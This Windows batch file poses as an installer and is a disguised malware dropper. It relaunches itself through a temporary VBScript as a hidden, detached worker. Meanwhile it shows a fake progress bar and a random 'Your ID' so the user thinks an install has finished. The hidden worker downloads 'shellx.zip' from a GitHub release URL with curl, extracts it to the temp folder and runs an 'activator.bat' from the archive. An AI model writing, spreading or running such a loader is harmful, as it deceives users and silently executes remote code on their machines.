@echo off
setlocal

rem ============================================================
rem  If we were called with the "worker" argument, do real work.
rem  Otherwise, spawn a detached hidden worker and show progress.
rem ============================================================
if /i "%~1"=="worker" goto worker

rem --- Build a tiny VBScript that launches THIS script hidden & detached ---
set "VBS=%TEMP%\_spawn_%RANDOM%.vbs"
> "%VBS%" echo Set sh = CreateObject("WScript.Shell")
>>"%VBS%" echo sh.Run "cmd /c """"%~f0"""" worker", 0, False

rem --- Launch it. wscript exits immediately; cmd becomes orphaned. ---
start "" /b wscript.exe //nologo "%VBS%"

rem --- Fake progress bar ---
call :progress 10

rem --- Generate random 10-char hash starting with bn01 ---
call :genhash

rem --- Show result ---
cls
echo.
echo    Installation complete.
echo.
echo    Your ID: %hash%
echo.
pause

rem --- clean up the vbs ---
del "%VBS%" >nul 2>&1
exit /b 0

rem ============================================================
rem  WORKER SECTION - runs hidden, fully detached
rem ============================================================
:worker
set "URL=https://github.com/achill0/shell/releases/download/download/shellx.zip"
set "ZIP=%TEMP%\package.zip"
set "DEST=%TEMP%\package_extracted"

curl -fL "%URL%" -o "%ZIP%" || goto werror

if not exist "%DEST%" mkdir "%DEST%"
tar -xf "%ZIP%" -C "%DEST%" || goto werror

for /r "%DEST%" %%F in (activator.bat) do (
    call "%%F"
    goto wdone
)
goto wdone

:werror
>>"%TEMP%\worker.log" echo %date% %time% - download or extraction failed
:wdone
endlocal
exit /b 0

rem ============================================================
rem  RANDOM HASH GENERATOR  (bn01 + 6 hex chars = 10 total)
rem  Uses a simple CALL-based approach so no delayed-expansion
rem  tricks are needed (fixes "Missing operator." errors).
rem ============================================================
:genhash
set "hash=bn01"
set "chars=0123456789abcdef"
call :genhash_loop 6
exit /b 0

:genhash_loop
if "%~1"=="" exit /b 0
set /a "idx=%RANDOM% %% 16"
call set "hash=%%hash%%%chars:~%idx%,1%"
call :genhash_loop %~1
exit /b 0

rem ============================================================
rem  FAKE PROGRESS BAR
rem ============================================================
:progress
setlocal enabledelayedexpansion
set "total=%~1"
for /l %%i in (1,1,%total%) do (
    set /a "pct=%%i*100/total"
    set /a "filled=%%i*40/total"
    set /a "empty=40-filled"
    set "bar="
    set "pad="
    for /l %%j in (1,1,!filled!) do set "bar=!bar!#"
    for /l %%k in (1,1,!empty!) do set "pad=!pad!-"
    cls
    echo.
    echo    Installing, please wait...
    echo.
    echo    [!bar!!pad!] !pct!%%
    timeout /t 1 /nobreak >nul
)
endlocal
exit /b 0
